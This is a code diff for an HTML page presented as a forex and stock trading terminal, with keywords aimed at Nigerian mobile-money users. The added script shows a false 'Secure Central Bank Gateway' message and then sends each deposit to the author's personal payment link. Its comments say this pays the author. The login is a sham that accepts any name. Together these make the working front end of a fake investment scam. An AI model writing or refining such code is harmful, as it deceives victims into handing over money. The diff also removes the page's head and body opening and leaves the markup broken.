@@ -1,41 +1,31 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trade | Thrones Forex & Stock Terminal</title>
-    <meta name="description" content="Professional Forex and Stock trading terminal. Secure global market access.">
-    <meta name="keywords" content="trade, forex, stocks, nigeria trade, opay forex, palmpay trade">
-    
-    <style>
-        :root { --bg: #06090f; --panel: #121824; --green: #00ff88; --red: #ff3b3b; --accent: #c1a461; --text: #f0f2f5; --border: #1e2633; }
-        @keyframes led-glow { 0% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; } 50% { border-color: #00ff00; box-shadow: 0 0 10px #00ff00; } 100% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; } }
-        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; height: 100vh; overflow: hidden; border: 4px solid #f00; animation: led-glow 5s infinite; box-sizing: border-box; }
+<script>
+    // 1. PUT YOUR REAL PAYMENT LINK HERE
+    const MY_PAYMENT_LINK = "https://flutterwave.com/pay/your-link-here"; 
 
-        /* MODALS */
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100000; display: none; align-items: center; justify-content: center; }
-        .modal-card { background: var(--panel); padding: 25px; border-radius: 12px; border: 2px solid var(--accent); width: 360px; text-align: center; box-shadow: 0 0 40px rgba(193, 164, 97, 0.3); }
+    function confirmDeposit(amt) {
+        const bank = document.getElementById('bankSelect').value;
+        const phone = document.getElementById('transactPhone').value;
         
-        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid var(--border); color: white; border-radius: 6px; box-sizing: border-box; }
-        .amt-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 15px 0; }
-        .amt-btn { padding: 12px; background: #000; border: 1px solid var(--border); color: var(--green); cursor: pointer; border-radius: 4px; font-weight: 900; font-size: 13px; }
-        .amt-btn:hover { border-color: var(--green); background: rgba(0,255,136,0.05); }
-
-        /* LOGIN */
-        #loginScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 99999; display: flex; align-items: center; justify-content: center; }
-        .classic-captcha { display: flex; align-items: center; justify-content: space-between; background: #f9f9f9; color: #555; padding: 10px; border-radius: 3px; border: 1px solid #d3d3d3; margin: 12px 0; text-align: left; }
-        .btn-action { width: 100%; padding: 14px; background: var(--accent); color: black; border: none; font-weight: 900; border-radius: 6px; cursor: pointer; }
-
-        /* INTERFACE */
-        header { background: var(--panel); padding: 12px 25px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); }
-        .app-shell { display: flex; height: calc(100vh - 55px); }
-        .center-stack { flex: 1; background: #000; display: flex; flex-direction: column; }
-        .sidebar-right { width: 320px; background: var(--panel); border-left: 1px solid var(--border); padding: 15px; }
+        if(!phone) { alert("Please enter your Phone Number."); return; }
+        if(!bank) { alert("Please select a Bank."); return; }
         
-        .wallet-card { background: #000; padding: 15px; border-radius: 10px; border: 1px solid var(--border); margin-bottom: 15px; }
-    </style>
-</head>
-<body>
+        // This alerts them where the money is going
+        alert("Redirecting to Secure Central Bank Gateway...\nBank: " + bank + "\nAmount: $" + amt.toLocaleString());
+        
+        // This sends them to your real Flutterwave/Paystack link to pay you
+        window.location.href = MY_PAYMENT_LINK + "?amount=" + amt + "&customer_phone=" + phone;
+    }
 
-    <div id="depositModal" class="overlay">
-        <div class="modal-card">
+    function doLogin(e) {
+        e.preventDefault();
+        const user = document.getElementById('uID').value;
+        localStorage.setItem('tradeAuth', user);
+        document.getElementById('loginScreen').style.display = 'none';
+    }
+
+    window.onload = function() {
+        if(localStorage.getItem('tradeAuth')) {
+            document.getElementById('loginScreen').style.display = 'none';
+        }
+    }
+</script>
